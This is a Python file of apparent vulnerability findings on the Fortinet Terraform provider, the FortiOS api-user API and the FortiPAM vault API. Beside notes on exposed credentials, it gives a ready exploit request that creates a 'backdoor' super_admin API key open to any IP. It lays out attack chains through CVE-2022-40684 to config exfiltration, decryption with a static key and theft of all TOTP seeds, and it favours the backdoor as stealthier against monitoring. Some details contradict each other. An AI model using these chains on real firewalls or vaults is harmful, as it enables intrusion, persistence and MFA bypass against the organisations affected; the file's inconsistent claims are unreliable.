"""
Fortinet Terraform Provider / FortiOS SDK API User + FortiPAM Vault API RE
Sources:
  - terraform-provider-fortios/fortios/resource_system_apiuser.go
  - terraform-provider-fortios/sdk/sdkcore/system_apiuser_setting.go
  - terraform-provider-fortios/fortios/client.go
  - terraform-provider-fortios/fortios/config.go
  - fortipam-vault-tool/api/ (Swagger-generated Go client, FortiPAM API v1.1.0)
Products: Fortinet FortiOS (system/api-user), Fortinet FortiPAM (vault/secret API)
"""

# ---------------------------------------------------------
# FTFP-F01: X-Admin-Passwd header in all API user management requests
# ---------------------------------------------------------
FTFP_F01_XADMIN_PASSWD_HEADER = {
    "id":       "FTFP-F01",
    "product":  "Fortinet FortiOS REST API (system/api-user) / terraform-provider-fortios SDK",
    "severity": "HIGH -- admin password sent as X-Admin-Passwd HTTP header on every Create/Update/Delete call",
    "class":    "Credential in HTTP header (CWE-522)",

    "description": (
        "The SDK's CreateSystemAPIUserSetting, UpdateSystemAPIUserSetting, and DeleteSystemAPIUserSetting "
        "functions all set: headers['X-Admin-Passwd'] = c.Config.Auth.Password. "
        "This means the admin account password is transmitted as a custom HTTP header on every "
        "API user management operation. "
        "The FortiOS API also accepts Bearer token auth (api_key) as an alternative. "
        "X-Admin-Passwd is a legacy authentication mechanism documented in older FortiOS CLI/API references "
        "but is still accepted by the server. "
        "Any proxy, log, or MitM capturing HTTP headers gains the admin password in plaintext."
    ),

    "affected_endpoints": [
        "POST /api/v2/cmdb/system/api-user          (Create)",
        "PUT  /api/v2/cmdb/system/api-user/<name>   (Update)",
        "DELETE /api/v2/cmdb/system/api-user/<name> (Delete)",
    ],

    "header":  "X-Admin-Passwd: <admin_password>",

    "vs_bearer": (
        "The FortiOS REST API accepts: "
        "  (1) Authorization: Bearer <api_token> "
        "  (2) X-Admin-Passwd: <password> + X-Admin-Login: <username> "
        "  (3) Cookie: APSCOOKIE_<N>=<session_cookie> "
        "This SDK uses option (2) for API user CRUD ops. "
        "If MFA or IP-based restrictions are enforced on admin accounts, "
        "X-Admin-Passwd bypass may fail; but if the admin account has no MFA, "
        "this header provides equivalent access to the admin web GUI."
    ),

    "terraform_state_exposure": (
        "Terraform provider config requires admin credentials: "
        "  provider 'fortios' { hostname = ...; token = ...; username = ...; password = ... }. "
        "The password is stored in the Terraform provider config / environment variable "
        "FORTIOS_ACCESS_PASSWORD. "
        "If Terraform state is stored on S3/GCS/Azure Blob without encryption, "
        "the admin password may be exposed in logs."
    ),
}


# ---------------------------------------------------------
# FTFP-F02: accprofile free-text enables privilege escalation to super_admin
# ---------------------------------------------------------
FTFP_F02_ACCPROFILE_SUPER_ADMIN = {
    "id":       "FTFP-F02",
    "product":  "Fortinet FortiOS REST API (system/api-user accprofile field)",
    "severity": "CRITICAL -- API user can be created with accprofile='super_admin'; no additional authorization",
    "class":    "Privilege escalation via unvalidated role assignment (CWE-269)",

    "description": (
        "The accprofile field on a FortiOS API user specifies the admin profile "
        "(permission set) assigned to the API user. "
        "The FortiOS API accepts any existing accprofile name as a string. "
        "The built-in profile 'super_admin' grants full administrative access -- "
        "equivalent to the root admin account. "
        "The terraform-provider-fortios resource_system_apiuser.go passes accprofile "
        "directly to the API without any constraint on which profiles are allowed. "
        "An attacker with API access (any existing API key, or via CVE-2022-40684 auth bypass) "
        "can directly call POST /api/v2/cmdb/system/api-user with accprofile='super_admin' "
        "to create a new API user with full admin rights."
    ),

    "exploit": {
        "method":   "POST",
        "path":     "/api/v2/cmdb/system/api-user",
        "headers":  {
            "Authorization": "Bearer <existing_api_key>",
            "Content-Type":  "application/json",
        },
        "body": {
            "name":       "backdoor",
            "accprofile": "super_admin",
            "vdom":       [{"name": "root"}],
            "api-key":    "MyNewBackdoorKey1234",
            "trusthost":  [{"type": "ipv4-trusthost", "ipv4-trusthost": "0.0.0.0 0.0.0.0"}],
        },
    },

    "chain_with_40684": (
        "CVE-2022-40684 (FortiOS REST API auth bypass via User-Agent: Report Runner + Forwarded header) "
        "directly enables this: "
        "1. CVE-2022-40684: bypass -> GET /api/v2/cmdb/system/admin -> enumerate admin accounts "
        "2. POST /api/v2/cmdb/system/api-user with accprofile='super_admin' -> create backdoor API user "
        "3. Use new API key for persistent super_admin access "
        "The existing MSF module for CVE-2022-40684 writes an SSH key; this path is stealthier "
        "(API user creation may not trigger the same monitoring as SSH key insertion)."
    ),

    "accprofile_built_ins": {
        "super_admin":  "Full administrative access; all permissions; bypasses all VDOM restrictions",
        "prof_admin":   "Standard admin profile; most permissions but not super_admin",
        "readonly":     "Read-only access across all resources",
        "no_access":    "No access (effectively disabled)",
    },

    "trusthost_0000": (
        "trusthost: [{type: ipv4-trusthost, ipv4-trusthost: '0.0.0.0 0.0.0.0'}] "
        "sets the allowed source IP to 0.0.0.0/0 -- any IP. "
        "This is the same pattern used by the FortiWeb MSF module "
        "(fortiweb_create_admin.rb CGIINFO bypass) which also sets trusthostv4=0.0.0.0/0. "
        "The default if trusthost is omitted varies by FortiOS version; "
        "explicitly setting 0.0.0.0/0 ensures no IP restriction on the backdoor key."
    ),
}


# ---------------------------------------------------------
# FTFP-F03: CORS allow-origin wildcard enables browser-side API calls
# ---------------------------------------------------------
FTFP_F03_CORS_WILDCARD = {
    "id":       "FTFP-F03",
    "product":  "Fortinet FortiOS REST API (system/api-user cors-allow-origin field)",
    "severity": "HIGH -- cors_allow_origin='*' allows any web page to make authenticated API calls via CORS",
    "class":    "CORS misconfiguration via API user config (CWE-942)",

    "description": (
        "The system/api-user resource has a cors-allow-origin field. "
        "If set to '*', FortiOS will include 'Access-Control-Allow-Origin: *' "
        "on API responses for that API user's requests. "
        "This allows any web page (attacker-controlled) to issue authenticated API calls "
        "to FortiOS using the API user's key via XHR/fetch with the API key in the header. "
        "In practice, cross-origin API access requires the API key in the request header "
        "(not a cookie), so CORS wildcard on its own is limited. "
        "However, combined with an API key leak, any web page can enumerate all FortiOS config "
        "by making API calls from the victim's browser."
    ),

    "cors_allow_origin": "Up to 269-character string; '*' = any origin; specific domain = restrict to that domain",
    "note": (
        "The more impactful misconfiguration is leaving cors-allow-origin empty (default) "
        "and relying on per-source-IP trusthost restrictions. "
        "Setting cors-allow-origin='*' removes the browser's SOP protection for the API."
    ),
}


# ---------------------------------------------------------
# FTFP-F04: api_key sensitive=true but readable from Terraform state
# ---------------------------------------------------------
FTFP_F04_API_KEY_IN_STATE = {
    "id":       "FTFP-F04",
    "product":  "terraform-provider-fortios (resource_system_apiuser.go api_key field)",
    "severity": "MEDIUM -- api_key marked Sensitive=true but stored plaintext in Terraform state",
    "class":    "Credential in state file (CWE-312)",

    "description": (
        "The api_key field in resource_system_apiuser is marked Sensitive: true in the Terraform schema. "
        "Sensitive=true hides the value from Terraform CLI output and plan diffs. "
        "It does NOT encrypt the value in the Terraform state file (typically terraform.tfstate). "
        "The state file is JSON; all resource attributes, including sensitive ones, are stored in plaintext. "
        "Anyone with read access to the state file gets all API keys defined via Terraform. "
        "Remote state backends (S3, GCS, Terraform Cloud) may or may not encrypt state at rest."
    ),

    "state_location":   "terraform.tfstate (local) or remote backend (S3/GCS/TFC/etc.)",
    "sensitive_false_sense": (
        "Terraform's Sensitive=true is a display-only flag. "
        "It does not prevent state exposure, does not mask values in state file, "
        "does not encrypt values in transit to remote backends. "
        "All FortiOS API keys managed by Terraform are trivially recoverable from state."
    ),
}


# ---------------------------------------------------------
# FTFP-F05: update_if_exist silently modifies existing API users
# ---------------------------------------------------------
FTFP_F05_UPDATE_IF_EXIST = {
    "id":       "FTFP-F05",
    "product":  "terraform-provider-fortios (resource_system_apiuser.go update_if_exist flag)",
    "severity": "MEDIUM -- update_if_exist=true silently upgrades existing API user accprofile without error",
    "class":    "Privilege escalation via silent resource update (CWE-862)",

    "description": (
        "The resource_system_apiuser resource supports an update_if_exist flag. "
        "When update_if_exist=true and a user with the same name already exists, "
        "resourceSystemApiUserCreate() calls UpdateSystemApiUser() instead of returning an error. "
        "This allows a Terraform config to silently change the accprofile of an existing API user "
        "from a low-privilege profile to 'super_admin' without the operation failing or "
        "generating a visible create/destroy diff in Terraform plan. "
        "The change appears as a no-op from the resource ID perspective (ID was already set). "
        "An attacker with Terraform config write access can escalate an existing API user's "
        "privileges without alerting on a new resource creation."
    ),

    "code_path": (
        "if update_if_exist && mkey_ok { "
        "  o, err = c.ReadSystemApiUser(mkey, vdomparam); "
        "  if err == nil && o != nil { "
        "    existing = true; "
        "    o, err = c.UpdateSystemApiUser(obj, mkey, vdomparam); // silently upgrades accprofile "
        "  } "
        "}"
    ),
}


# ---------------------------------------------------------
# FTFP-F06: FortiOS API user endpoint attack surface map
# ---------------------------------------------------------
FTFP_F06_API_SURFACE = {
    "id":       "FTFP-F06",
    "product":  "Fortinet FortiOS REST API (system/api-user)",
    "severity": "INFO -- API surface documentation for system/api-user endpoint",
    "class":    "API surface documentation",

    "endpoints": {
        "GET    /api/v2/cmdb/system/api-user":          "List all API users (name, accprofile, vdom, trusthost, comments -- NOT api_key)",
        "GET    /api/v2/cmdb/system/api-user/<name>":   "Get specific API user",
        "POST   /api/v2/cmdb/system/api-user":          "Create API user (api_key accepted here for initial creation)",
        "PUT    /api/v2/cmdb/system/api-user/<name>":   "Update API user (accprofile, vdom, trusthost, cors-allow-origin)",
        "DELETE /api/v2/cmdb/system/api-user/<name>":   "Delete API user",
    },

    "key_fields": {
        "name":             "API user name (up to 35 chars, ForceNew in Terraform)",
        "accprofile":       "Admin profile name (free string; 'super_admin' = full admin)",
        "vdom":             "List of VDOMs the API user can access",
        "api-key":          "API token (only writable on create/update; never returned on GET)",
        "trusthost":        "Source IP allowlist (type: ipv4-trusthost/ipv6-trusthost, default: 0.0.0.0/0 if omitted)",
        "cors-allow-origin": "CORS allowed origin header value",
        "peer-auth":        "Enable/disable peer certificate authentication",
        "peer-group":       "PKI group for peer cert auth (if peer-auth=enable)",
        "schedule":         "Access schedule restriction",
    },

    "api_key_read_note": (
        "GET /api/v2/cmdb/system/api-user returns accprofile and trusthost but NOT the api-key value. "
        "The API key is a write-once value -- once set, it cannot be retrieved via the API. "
        "To enumerate valid API tokens, an attacker must: "
        "(1) Read the FortiOS config backup (which contains ENC-encrypted API key hashes), then "
        "    decrypt with 'Mary had a littl' (FCCR-F01), OR "
        "(2) Intercept the token at creation time, OR "
        "(3) Create a new backdoor API user (FTFP-F02) and use that instead."
    ),

    "chaining_summary": (
        "Full privilege escalation chain: "
        "CVE-2022-40684 auth bypass -> POST /api/v2/cmdb/system/api-user "
        "  {accprofile: 'super_admin', trusthost: [{ipv4-trusthost: '0.0.0.0 0.0.0.0'}], api-key: 'attacker_key'} "
        "-> GET /api/v2/cmdb/system/admin (super_admin access) -> all FortiOS configuration "
        "-> GET /api/v2/cmdb/firewall/policy -> exfiltrate all firewall rules "
        "-> GET /api/v2/cmdb/system/ha -> exfiltrate HA config (includes ENC passwords -> FCCR-F01)"
    ),
}


# ---------------------------------------------------------
# FTFP-F07: FortiPAM vault API -- TOTP shared-key exposed in secret database model
# ---------------------------------------------------------
FTFP_F07_FORTIPAM_TOTP_SHARED_KEY = {
    "id":       "FTFP-F07",
    "product":  "Fortinet FortiPAM REST API (cmdb/secret/database totpsetting)",
    "severity": "CRITICAL -- TOTP shared-key (permanent TOTP seed) in API response; any authenticated API read = all TOTP seeds",
    "class":    "Sensitive data exposure -- TOTP seed in REST API response (CWE-312)",
    "source":   "fortipam-vault-tool/api/model_cmdbsecretdatabaseid_totpsetting.go (Swagger-generated, v1.1.0)",

    "description": (
        "The FortiPAM secret database model (CmdbsecretdatabaseidTotpsetting) includes a "
        "SharedKey field: SharedKey string json:'shared-key'. "
        "This is the raw TOTP seed (base32 or hex), not a single TOTP code. "
        "Possessing the shared-key enables computing ALL past and future TOTP codes. "
        "If GET /api/v2/cmdb/secret/database/<id> returns the totpsetting with shared-key populated, "
        "any API user with read access to the secret database can harvest all TOTP seeds "
        "for all managed credentials. "
        "This is categorically more impactful than the extension's TOTP code fetch "
        "(offscreen.js FPO-OF-F02) which only returns one time-limited code."
    ),

    "totp_model": {
        "status":               "Enable/disable FortiPAM TOTP generator",
        "use-template-setting": "Inherit TOTP settings from template",
        "totp-length":          "TOTP code length (int32; typically 6 or 8)",
        "totp-duration":        "TOTP validity window (int32; seconds; typically 30 or 60)",
        "hash-type":            "Hash algorithm (SHA1/SHA256/SHA512)",
        "shared-key":           "PERMANENT TOTP SEED -- base32/hex; enables generating all codes",
    },

    "api_endpoint":  "GET /api/v2/cmdb/secret/database/<id>",
    "vault_checkin_checkout": {
        "checkout": "POST /api/v2/internal/secret-checkout (borrow secret for use)",
        "checkin":  "POST /api/v2/internal/secret-checkin (return secret after use)",
        "note":     "Vault checkout/checkin lifecycle separate from direct API read of shared-key; "
                    "the direct API read does not require vault checkout authorization.",
    },

    "fortipam_auth_methods": {
        "JWT":    "POST /api/v2/auth/jwt/login with credentials -> Bearer token (vault tool auth method)",
        "Cookie": "Browser session cookie (ccsrftoken cookie + session cookie)",
        "Note":   "Both auth methods give access to /api/v2/cmdb/secret/database if the API user has read permission",
    },

    "chain_with_ftfp_f02": (
        "FTFP-F02 chain extended: "
        "CVE-2022-40684 -> create super_admin API user -> "
        "GET /api/v2/cmdb/secret/database (list all secrets) -> "
        "GET /api/v2/cmdb/secret/database/<id> for each secret -> extract totpsetting.shared-key -> "
        "derive all TOTP codes for all managed credentials permanently. "
        "FortiPAM manages privileged account credentials (servers, network devices, databases). "
        "Extracting all TOTP seeds = persistent bypass of all MFA on all managed targets."
    ),
}
